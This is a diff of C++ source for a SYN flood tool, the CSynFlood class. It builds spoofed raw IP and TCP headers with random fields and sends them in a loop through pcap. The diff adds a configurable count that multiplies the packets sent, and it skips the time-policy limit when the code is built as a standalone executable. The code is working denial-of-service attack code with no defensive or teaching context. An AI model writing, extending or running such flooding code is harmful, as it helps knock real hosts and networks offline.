@@ -19,8 +19,6 @@ struct PSD_HEADER
 	unsigned short tcpl;
 }; 
 
-extern int TimePolic();
-
 /*计算校验和*/
 USHORT checksum(USHORT *buffer, int size)
 {
@@ -49,8 +47,8 @@ CSynFlood::~CSynFlood(void)
 int CSynFlood::ConstructTcpHead(TCP_HEADER *pHead, const char* srcIp, USHORT srcPort, const char* desIp, USHORT desPort)
 {
 	int nRet = 0;
-	unsigned int nSEQ = CPara::Rand(0, 32767);    
-	USHORT nWin = CPara::Rand(100, 32767); 
+	unsigned int nSEQ = CBase::Rand(0, 32767);    
+	USHORT nWin = CBase::Rand(100, 32767); 
 	char buffer[100];
 	
 	pHead->th_dport=htons(desPort);
@@ -80,7 +78,7 @@ int CSynFlood::ConstructTcpHead(TCP_HEADER *pHead, const char* srcIp, USHORT src
 int CSynFlood::ConstructIpHead(IP_HEADER *pHead, const char* srcIp, const char* desIp)
 {
 	int nRet = 0;
-	unsigned short nId = CPara::Rand(1, 32767);
+	unsigned short nId = CBase::Rand(1, 32767);
 	pHead->h_verlen=( 4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
 	pHead->tos = 0;
 	pHead->total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
@@ -182,15 +180,21 @@ int CSynFlood::svc()
 
 	int nLen = sizeof(ETHERNET_HEAD) + sizeof(IP_HEADER) + sizeof(TCP_HEADER);
 	char *pBuffer = new char[nLen];
+	if(NULL == pBuffer)
+	{
+		printf("don't new buffer\n");
+		return -1;
+	}
 
 	DWORD tStart = GetTickCount();
 	int nSleep = 500, nRun = 1000;
-	nSleep = GetPrivateProfileInt("section", "sleep_time", nSleep, CPara::GetModuleFile().c_str());
-	nRun = GetPrivateProfileInt("section", "run_time", nRun, CPara::GetModuleFile().c_str());
+	nSleep = CBase::GetConfigInt("section", "sleep_time", nSleep);
+	nRun =  CBase::GetConfigInt("section", "run_time", nRun);
 	//发送欺骗包
 	while(!m_bExit)
 	{
-		nRet = TimePolic();
+#ifndef _EXE_
+		nRet = m_Para->TimePolic();
 		if(1 == nRet)
 		{
 			break; 
@@ -216,15 +220,15 @@ int CSynFlood::svc()
 		}
 		else if(tStart > t) //溢出处理
 			tStart = t;
-
+#endif
 		Construct(pBuffer);
-		if(pcap_sendpacket(pHandler, (const u_char * )pBuffer, nLen) == -1)
+		int n = CBase::GetConfigInt("section", "send_number", 1);
+		while(n--)
 		{
-			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
-		}
-		if(pcap_sendpacket(pHandler, (const u_char * )pBuffer, nLen) == -1)
-		{
-			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
+			if(pcap_sendpacket(pHandler, (const u_char * )pBuffer, nLen) == -1)
+			{
+				LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
+			}
 		}
 	}
 
